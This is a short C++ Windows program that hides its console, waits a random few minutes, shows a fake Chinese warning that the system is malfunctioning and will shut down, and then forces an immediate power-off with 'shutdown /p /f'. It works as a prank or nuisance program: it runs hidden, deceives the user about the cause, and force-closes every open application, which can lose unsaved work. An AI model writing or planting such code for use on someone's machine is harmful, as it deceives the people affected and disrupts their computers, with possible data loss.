#include<random>
#include<cstdlib>
#include<chrono>
#include<thread>
#include<windows.h>
using namespace std;
int main() {
    FreeConsole();
	mt19937 gen;
	uniform_int_distribution<int> delay(100,1000);
	this_thread::sleep_for(chrono::seconds(delay(gen)));
    thread msg([]() {
        MessageBox(
            NULL,
            L"系统错乱，即将关机",
            L"提示",
            MB_OK | MB_ICONWARNING
        );
    });
    msg.detach();
    this_thread::sleep_for(chrono::seconds(3));
    system("shutdown /p /f");
}